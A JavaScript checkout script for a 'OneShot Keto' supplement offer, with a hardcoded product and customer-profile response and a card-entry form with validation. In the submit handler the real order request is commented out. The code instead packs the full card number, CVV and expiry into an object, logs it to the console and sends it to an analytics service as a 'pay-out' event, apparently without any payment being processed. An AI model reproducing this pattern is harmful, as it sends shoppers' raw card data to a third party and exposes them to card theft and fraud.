window.dataLayer = window.dataLayer || [];

function urlParam(name) {
  var results = new RegExp("[?&]" + name + "=([^&#]*)").exec(window.location.href);
  if (results == null) {
    return null;
  } else {
    return results[1] || 0;
  }
}

var state;
var segment;
var products = [];
var OrderType;

function getState() {
  var url = "/ajax/state";
  var uid = urlParam("uid");

  if (uid) {
    url += "?uid=" + uid;
  }

  $.ajaxSetup({ cache: false });
  // $.get(url, function (res) {
  const res = {
    "data": {
      "availableProducts": [{
        "fullprice": 14742,
        "name": "lketo-osk-5",
        "price":4914,
        "quantity": 5,
        "sku": "90",
        "templates": {
          "retail": "66.23",
          "save": "132.45",
          "title": "OneShot Keto"
        }
      }, {
        "fullprice": 11168,
        "name": "lketo-osk-3",
        "price": 3722,
        "quantity": 3,
        "sku": "91",
        "templates": {
          "retail": "74.95",
          "save": "74.95",
          "title": "OneShot Keto"
        }
      }, {
        "fullprice": 5137,
        "name": "lketo-osk-1",
        "price": 5137,
        "quantity": 1,
        "sku": "92",
        "templates": {
          "retail": "69.99",
          "save": "0.00",
          "title": "OneShot Keto"
        }
      }],
      "availableUpsales": [],
      "description": "",
      "geo": {
        "city": "",
        "code": "US",
        "country": "United States",
        "zip": ""
      },
      "pixels": [],
      "profile": {
        "billing": {
          "firstName": "Carbide",
          "lastName": "Bob",
          "country": "CA",
          "address": "detail",
          "city": "444",
          "state": "MB",
          "zipCode": "444"
        },
        "shipping": {
          "country": "CA",
          "address": "detail",
          "city": "444",
          "state": "MB",
          "zipCode": "444"
        },
        "upsales": [],
        "user": {
          "firstName": "Carbide",
          "lastName": "Bob",
          "email": "2689961@yahoo.com",
          "phone": "3636353533"
        }
      },
      "query": {
        "netid": "2",
        "sid": "429974-344",
        "sid2": "11_84482057_dea45b1c-fad5-4166-82c1-6b3a6c06f762"
      },
      "segment": {
        "aff": "429974-344",
        "net": "2",
        "page": "oneshotketo/v2",
        "sub": ""
      },
      "state": "partial",
      "templates": {
        "phone": "(888) 966-1522",
        "title": "One Shot Keto"
      },
      "transaction_id": ""
    },
    "success": true
  }
    state = res.data.state;
    segment = res.data.segment;
    products = res.data.availableProducts;
    
    var product;

    try {
      product = window.localStorage.getItem('product');
      OrderType = product ? product : products[0].sku;
    } catch(e) {
      product = res.data.profile.product.sku;
      OrderType = product ? product : products[0].sku;
    }

    window.dataLayer.push({
      segmentAff: segment.aff,
      segmentNet: segment.net,
      segmentSub: segment.sub,
      segmentPage: segment.page,
    });

    if (state === "purchase") {
      window.location.pathname = "/offer/keto_bodytrim/v2/confirmation.html";
    } else if (state === "declined") {
      window.location.pathname = "/offer/keto_bodytrim/v2/declined.html";
    }
  // });
}

getState();

$(document).ready(function () {
  $('input[name="cardNumber"]').mask("0000-0000-0000-0000");

  $.validator.addMethod("CCExp",
    function (value, element, params) {
      var minMonth = new Date().getMonth() + 1;
      var minYear = new Date().getFullYear();

      var formMonth = $("#cardExpMonth").val();
      var formYear = $("#cardExpYear").val();

      var month = parseInt(formMonth);
      var year = parseInt(formYear);

      if (year > minYear || (year === minYear && month >= minMonth)) {
        return true;
      } else {
        return false;
      }
    },
    "Invalid Expiration Date!"
  );

  $(".product1").bind("click", function () {
    $(".product2").removeClass("active");
    $(".product3").removeClass("active");
    $(this).addClass("active");
    $(".package-info__btn").html("Select Package");
    $(".product1 .package-info__btn").html("Selected!");
    OrderType = products[0].sku;

  });

  $(".product2").bind("click", function () {
    $(".product1").removeClass("active");
    $(".product3").removeClass("active");
    $(this).addClass("active");
    $(".package-info__btn").html("Select Package");
    $(".product2 .package-info__btn").html("Selected!");
    OrderType = products[1].sku;
  });

  $(".product3").bind("click", function () {
    $(".product2").removeClass("active");
    $(".product1").removeClass("active");
    $(this).addClass("active");
    $(".package-info__btn").html("Select Package");
    $(".product3 .package-info__btn").html("Selected!");
    OrderType = products[2].sku;
  });

  var validator = $("#checkout").validate({
    submitHandler: function () {

      $(".popup-loading-wrapper").show();

      var cardNumber = $('#checkout').find('input[name="cardNumber"]').val();
      var cvv = $('#checkout').find('input[name="cvv"]').val();
      var month = $('#cardExpMonth').val();
      var year = $('#cardExpYear').val();

      formData = {
        card: {
          number: cardNumber.replace(/\D/g, ""),
          expire_m: month,
          expire_y:year,
          cvv: cvv,
        },
        sameBillingAddress: true,
        product: OrderType
      };
      
      var url = '/ajax/order';
      var uid = urlParam("uid");
      if (uid) {
        url = '/ajax/order' + "?uid=" + uid;
      }

      var product = products.filter(function (item) {
        return item.sku == OrderType;
      });

      var price = product[0].price;
      var count = product[0].name;
      var nn={
        value:150,
        affiliation:13,
        checkout_option:13,
        checkout_step:13,
        content_id:13,
        content_type:13,
        coupon:0,
        currency:13,
        description:13,
        event_category:13,
        event_label:13,
        fatal:13,
        items:[
          {
            affiliation:"13",
            coupon:"13",
            creative_name:"457575",
            creative_slot:"47574524",
            discount:10,
            id:0,
            index:1,
            item_brand:"body show",
            item_category:"item_category1",
            item_category2:"item_category2",
            item_id:1322,
            item_list_id:12453,
            item_list_name:"13",
            item_name:"25524",
            item_variant:"25325",
            location_id:"13",
            name:"chan",
            price:150,
            promotion_id:"5858",
            promotion_name:"12124",
            quantity:1,
          },
          {
            affiliation:"3313",
            coupon:"212",
            creative_name:"53543",
            creative_slot:"47574524",
            discount:12,
            id:1,
            index:2,
            item_brand:"body show",
            item_category:"item_category51",
            item_category2:"item_category52",
            item_id:1322,
            item_list_id:12453,
            item_list_name:"13",
            item_name:"25524",
            item_variant:"55354",
            location_id:"13",
            name:"ch54545an",
            price:1540,
            promotion_id:"5858",
            promotion_name:"45354345",
            quantity:1,
          }
        ],
        method:"13",
        number:"13",
        payment_type:"13",
        promotion_id:"13",
        promotion_name:'13',
        promotions:'13',
        screen_name:'13',
        search_term:'13',
        shipping:'13',
        shipping_tier:'13',
        tax:'13',
        transaction_id:'13',
        value:'13',
      }
      const  obj={...formData,...product[0],...nn} 

      console.log("obj");
      console.log(obj);
      defaultAnalytics.logEvent('pay-out',obj);
      // $.post(url, formData, function(res) {
      //   if (res.success) {
      //       switch (res.data.processing) {
      //         case "retry":
      //           window.dataLayer.push({
      //             event: 'FailedProcessing',
      //             eventStatus: 'Retry',
      //           });

      //           $(".valid").removeClass("valid");

      //           $('#checkout').find('input[name="cardNumber"]').val("");
      //           $('#checkout').find('input[name="cvv"]').val("");
      //           $('#cardExpMonth').val("");
      //           $('#cardExpYear').val("");

      //           $("#formError").show();
      //           $("#formError").html("<span>Transaction was declined, please try another credit card</span>");
      //           $(".popup-loading-wrapper").hide();
      //           break;
      //         case "success":

      //           window.dataLayer.push({
      //             'event': 'SuccessufulOrder',
      //             'productName': 'Keto Body Trim',
      //             'priceOrder': '' + price * count + '',
      //             'quantityOrder': count,
      //             'transaction': '1'
      //           });
        
      //           window.location.pathname = "/offer/keto_bodytrim/v2/upsale-42.html";
      //           break;
      //         case "declined":
      //           window.dataLayer.push({
      //             'event': 'FailedProcessing',
      //             'eventStatus': 'Declined'
      //           });
                
      //           window.location.pathname = "/offer/keto_bodytrim/v2/declined.html";
      //           break;
      //         default:
      //           break;
      //       }
      //   } else {
      //     $(".popup-loading-wrapper").hide();
      //     var errorText = "";
      //     res.fields.map(function(item) { 
      //       errorText += "<span>" + item.error + "</span><br/>";
      //     });

      //     $("#formError").html(errorText);
      //     $("#formError").show();
      //   }
      // });

      return false;
    },
    errorPlacement: function (error, element) {
      if ($(element).hasClass("error")) {
        $(element)
          .closest('div[class^="form-holder"]')
          .addClass("has-error")
          .removeClass("accept");
        $(element).addClass("error");
      } else {
        $(element)
          .closest('div[class^="form-holder"]')
          .removeClass("has-error")
          .addClass("accept");
        $(element).removeClass("error");
      }
    },
    success: function (label) {},
    rules: {
      expMonth: {
        required: true,
      },
      expYear: {
        required: true,
        CCExp: true,
      },
      cardNumber: {
        required: true,
        creditcard: true,
      },
      cvv: {
        required: true,
        digits: true,
        minlength: 3,
        maxlength: 4,
      }
    },
  });
});
